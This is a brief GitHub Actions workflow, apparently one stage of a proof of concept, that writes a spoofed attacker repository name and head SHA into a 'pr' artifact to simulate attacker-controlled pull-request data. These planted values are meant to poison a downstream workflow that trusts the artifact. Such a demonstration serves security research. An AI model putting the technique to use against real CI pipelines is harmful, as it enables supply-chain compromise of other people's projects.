name: Trigger E2E
on:
  push:
    branches: [main, master]
jobs:
  save:
    runs-on: ubuntu-latest
    steps:
      - name: Save spoofed repo info (simulates attacker-controlled PR data)
        run: |
          mkdir -p ./pr
          echo "omarrrfds/poc-attacker-payload" > ./pr/repo_name
          echo "master" > ./pr/head_sha
      - uses: actions/upload-artifact@v4
        with:
          name: pr
          path: pr/

